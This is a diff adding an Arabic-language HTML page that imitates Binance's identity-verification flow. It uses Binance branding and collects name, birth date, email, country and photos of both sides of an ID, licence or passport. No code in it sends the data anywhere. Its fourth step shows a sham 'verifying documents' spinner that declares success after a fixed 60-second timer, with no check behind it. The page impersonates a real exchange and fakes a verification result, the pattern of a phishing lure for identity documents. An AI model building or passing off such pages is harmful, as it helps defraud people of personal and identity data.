@@ -1,0 +1,417 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>التحقق من الهوية - Binance</title>
+  <!-- أيقونات Font Awesome -->
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+  <!-- مكتبة أعلام الدول -->
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.5.0/css/flag-icon.min.css">
+  <style>
+    :root {
+      --primary: #FCD535;
+      --background: #1E2329;
+      --surface: #2B3139;
+      --text-primary: #EAECEF;
+    }
+    body {
+      font-family: 'Segoe UI Arabic', sans-serif;
+      background-color: var(--background);
+      color: var(--text-primary);
+      margin: 0;
+      padding: 20px;
+    }
+    /* رأس الصفحة */
+    .site-header {
+      display: flex;
+      align-items: center;
+      padding: 10px 20px;
+      background: var(--surface);
+      margin-bottom: 20px;
+      direction: ltr;
+      width: 100%;
+    }
+    .logo {
+      display: flex;
+      align-items: center;
+    }
+    .logo img {
+      height: 40px;
+      margin-right: 10px;
+    }
+    .logo span {
+      font-size: 1.5rem;
+      font-weight: bold;
+      color: var(--primary);
+    }
+    /* شريط التقدم */
+    .progress-bar {
+      height: 4px;
+      background: #373d45;
+      margin: 20px 0;
+      border-radius: 2px;
+    }
+    .progress-fill {
+      height: 100%;
+      background: var(--primary);
+      width: 0;
+      border-radius: 2px;
+      transition: width 0.3s ease;
+    }
+    .container {
+      max-width: 480px;
+      margin: 20px auto;
+      background: var(--surface);
+      border-radius: 8px;
+      padding: 24px;
+      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.25);
+    }
+    h2 {
+      color: var(--primary);
+      font-size: 1.5rem;
+      margin-bottom: 1.5rem;
+      text-align: center;
+    }
+    .form-group {
+      margin-bottom: 1.5rem;
+    }
+    label {
+      display: block;
+      margin-bottom: 0.5rem;
+      font-weight: 500;
+    }
+    input[type="text"],
+    input[type="date"],
+    input[type="email"],
+    select {
+      width: 100%;
+      padding: 10px;
+      margin-top: 5px;
+      border: 1px solid #464d57;
+      border-radius: 6px;
+      background: #3a4048;
+      color: var(--text-primary);
+    }
+    /* قائمة اختيار الدولة */
+    .country-selector {
+      display: flex;
+      gap: 10px;
+      flex-wrap: wrap;
+    }
+    .country {
+      display: flex;
+      align-items: center;
+      gap: 5px;
+      background: #3a4048;
+      border: 1px solid #464d57;
+      border-radius: 6px;
+      padding: 10px;
+      cursor: pointer;
+      transition: border 0.2s ease;
+    }
+    .country:hover {
+      border-color: var(--primary);
+    }
+    .country.active {
+      border-color: var(--primary);
+      background: rgba(252, 213, 53, 0.1);
+    }
+    .flag-icon {
+      width: 24px;
+      height: 18px;
+    }
+    /* خيارات الوثيقة */
+    .radio-group {
+      display: flex;
+      flex-direction: column;
+      gap: 12px;
+    }
+    .radio-card {
+      display: flex;
+      align-items: center;
+      cursor: pointer;
+      transition: all 0.2s ease;
+      padding: 10px;
+      background: #3a4048;
+      border: 1px solid #464d57;
+      border-radius: 6px;
+    }
+    .radio-card:hover {
+      border-color: var(--primary);
+    }
+    .radio-card.active {
+      border-color: var(--primary);
+      background: rgba(252, 213, 53, 0.1);
+    }
+    /* تصميم صفحة رفع الصور الأصلي */
+    .preview-container {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 16px;
+      margin: 20px 0;
+    }
+    .preview-box {
+      position: relative;
+      border-radius: 6px;
+      overflow: hidden;
+      aspect-ratio: 16/9;
+      background: #3a4048;
+    }
+    .preview-image {
+      width: 100%;
+      height: 100%;
+      object-fit: cover;
+    }
+    .upload-area {
+      border: 2px dashed #464d57;
+      text-align: center;
+      padding: 40px 20px;
+      cursor: pointer;
+      transition: border-color 0.2s ease;
+    }
+    .upload-area:hover {
+      border-color: var(--primary);
+    }
+    /* أزرار الانتقال مع تأثير حديث عند النقر */
+    .btn-primary {
+      width: 100%;
+      padding: 14px;
+      background: var(--primary);
+      color: #1E2329;
+      border: none;
+      border-radius: 6px;
+      font-weight: 600;
+      cursor: pointer;
+      transition: transform 0.1s ease, box-shadow 0.1s ease;
+    }
+    .btn-primary:hover {
+      background: #e6b800;
+    }
+    .btn-primary:active {
+      transform: scale(0.98);
+      box-shadow: 0 2px 8px rgba(0, 0, 0, 0.3);
+    }
+    /* حالة التحقق */
+    .status-card {
+      text-align: center;
+      padding: 40px 20px;
+    }
+    .status-icon {
+      font-size: 48px;
+      color: var(--primary);
+      margin-bottom: 20px;
+    }
+    .loader {
+      width: 48px;
+      height: 48px;
+      border: 3px solid #464d57;
+      border-top-color: var(--primary);
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+      margin: 20px auto;
+    }
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+    .hidden {
+      display: none;
+    }
+  </style>
+</head>
+<body>
+  <!-- رأس الصفحة مع شعار Binance -->
+  <header class="site-header">
+    <div class="logo">
+      <img src="https://cryptologos.cc/logos/binance-coin-bnb-logo.png?v=023" alt="Binance Logo">
+      <span>BINANCE</span>
+    </div>
+  </header>
+  
+  <!-- شريط التقدم -->
+  <div class="progress-bar">
+    <div class="progress-fill" id="progress"></div>
+  </div>
+
+  <!-- Step 1: معلومات الهوية -->
+  <div id="step1" class="container">
+    <h2>معلومات الهوية</h2>
+    <div class="form-group">
+      <label for="fullName">الاسم الكامل</label>
+      <input type="text" id="fullName" placeholder="أدخل اسمك الكامل">
+    </div>
+    <div class="form-group">
+      <label for="birthDate">تاريخ الميلاد</label>
+      <input type="date" id="birthDate">
+    </div>
+    <div class="form-group">
+      <label for="gender">الجنس</label>
+      <select id="gender">
+        <option value="male">ذكر</option>
+        <option value="female">أنثى</option>
+        <option value="other">آخر</option>
+      </select>
+    </div>
+    <div class="form-group">
+      <label for="email">البريد الإلكتروني</label>
+      <input type="email" id="email" placeholder="أدخل بريدك الإلكتروني">
+    </div>
+    <button class="btn-primary" onclick="nextStep(2)">المتابعة</button>
+  </div>
+
+  <!-- Step 2: اختيار نوع الوثيقة والبلد المُصدر -->
+  <div id="step2" class="container hidden">
+    <h2>اختر نوع الوثيقة</h2>
+    <div class="form-group">
+      <label>البلد المُصدر</label>
+      <div class="country-selector">
+        <div class="country active" data-value="yemen" onclick="selectCountry(this)">
+          <span class="flag-icon flag-icon-ye"></span>
+          <span>اليمن</span>
+        </div>
+        <div class="country" data-value="saudi" onclick="selectCountry(this)">
+          <span class="flag-icon flag-icon-sa"></span>
+          <span>السعودية</span>
+        </div>
+        <div class="country" data-value="uae" onclick="selectCountry(this)">
+          <span class="flag-icon flag-icon-ae"></span>
+          <span>الإمارات</span>
+        </div>
+        <div class="country" data-value="egypt" onclick="selectCountry(this)">
+          <span class="flag-icon flag-icon-eg"></span>
+          <span>مصر</span>
+        </div>
+        <div class="country" data-value="other" onclick="selectCountry(this)">
+          <i class="fas fa-globe"></i>
+          <span>دولة أخرى</span>
+        </div>
+      </div>
+      <input type="hidden" id="selectedCountry" value="yemen">
+    </div>
+    <div class="form-group">
+      <label>نوع الوثيقة</label>
+      <div class="radio-group">
+        <div class="radio-card active" onclick="selectDocument('idCard', this)">
+          <input type="radio" name="documentType" id="idCard" checked hidden>
+          <i class="fas fa-id-card" style="margin-left: 12px;"></i>
+          <span>بطاقة الهوية الوطنية</span>
+        </div>
+        <div class="radio-card" onclick="selectDocument('driverLicense', this)">
+          <input type="radio" name="documentType" id="driverLicense" hidden>
+          <i class="fas fa-car" style="margin-left: 12px;"></i>
+          <span>رخصة القيادة</span>
+        </div>
+        <div class="radio-card" onclick="selectDocument('passport', this)">
+          <input type="radio" name="documentType" id="passport" hidden>
+          <i class="fas fa-passport" style="margin-left: 12px;"></i>
+          <span>جواز السفر</span>
+        </div>
+      </div>
+    </div>
+    <button class="btn-primary" onclick="nextStep(3)">المتابعة</button>
+  </div>
+
+  <!-- Step 3: متطلبات رفع الصور (تصميمها الأصلي) -->
+  <div id="step3" class="container hidden">
+    <h2>متطلبات التحميل</h2>
+    <div class="form-group">
+      <div class="preview-container">
+        <div class="preview-box">
+          <img id="frontPreview" class="preview-image" alt="Front Preview">
+          <div class="upload-area" onclick="document.getElementById('frontFile').click()">
+            <i class="fas fa-camera fa-2x"></i>
+            <p>الوجه الأمامي</p>
+          </div>
+        </div>
+        <div class="preview-box">
+          <img id="backPreview" class="preview-image" alt="Back Preview">
+          <div class="upload-area" onclick="document.getElementById('backFile').click()">
+            <i class="fas fa-camera fa-2x"></i>
+            <p>الوجه الخلفي</p>
+          </div>
+        </div>
+      </div>
+      <ul style="padding-right: 20px; color: #8a9199;">
+        <li>• يجب أن تكون الصور واضحة وملونة</li>
+        <li>• الحد الأقصى لحجم الملف 10MB</li>
+        <li>• التنسيقات المسموحة: JPG, PNG</li>
+        <li>• يجب أن تكون الوثيقة سارية المفعول</li>
+      </ul>
+    </div>
+    <button class="btn-primary" onclick="nextStep(4)">تحقق من الصور</button>
+  </div>
+
+  <!-- Step 4: حالة التحقق -->
+  <div id="step4" class="container hidden">
+    <div class="status-card">
+      <div class="loader"></div>
+      <h3>جاري التحقق من المستندات</h3>
+      <p>عادةً ما تستغرق العملية 2-5 دقائق</p>
+      <p style="color: #8a9199; margin-top: 20px;">
+        <i class="fas fa-info-circle"></i>
+        سيتم إرسال النتيجة عبر البريد الإلكتروني والتطبيق
+      </p>
+    </div>
+  </div>
+
+  <input type="file" id="frontFile" hidden accept="image/*">
+  <input type="file" id="backFile" hidden accept="image/*">
+
+  <script>
+    let currentStep = 1;
+    const steps = 4;
+    function updateProgress() {
+      const progress = (currentStep / steps) * 100;
+      document.getElementById('progress').style.width = progress + '%';
+    }
+    function nextStep(step) {
+      setTimeout(() => {
+        document.getElementById('step' + currentStep).classList.add('hidden');
+        currentStep = step;
+        document.getElementById('step' + currentStep).classList.remove('hidden');
+        updateProgress();
+        if(currentStep === 4) {
+          setTimeout(showSuccess, 60000);
+        }
+      }, 1000);
+    }
+    function showSuccess() {
+      const step4 = document.getElementById('step4');
+      step4.innerHTML = `
+        <div class="status-card">
+          <i class="fas fa-check-circle status-icon" style="color: var(--primary);"></i>
+          <h3>تم رفع المستندات بنجاح</h3>
+          <p>تم التحقق من المستندات وإتمام عملية الرفع.</p>
+        </div>
+      `;
+    }
+    function selectDocument(type, element) {
+      document.querySelectorAll('.radio-card').forEach(el => el.classList.remove('active'));
+      document.getElementById(type).checked = true;
+      element.classList.add('active');
+    }
+    function selectCountry(element) {
+      document.querySelectorAll('.country').forEach(el => el.classList.remove('active'));
+      element.classList.add('active');
+      document.getElementById('selectedCountry').value = element.getAttribute('data-value');
+    }
+    document.getElementById('frontFile').addEventListener('change', function(e) {
+      handleImageUpload(e, 'frontPreview');
+    });
+    document.getElementById('backFile').addEventListener('change', function(e) {
+      handleImageUpload(e, 'backPreview');
+    });
+    function handleImageUpload(event, previewId) {
+      const file = event.target.files[0];
+      if(file && file.type.startsWith('image/')) {
+        const reader = new FileReader();
+        reader.onload = function(e) {
+          const preview = document.getElementById(previewId);
+          preview.src = e.target.result;
+        };
+        reader.readAsDataURL(file);
+      }
+    }
+  </script>
+</body>
+</html>
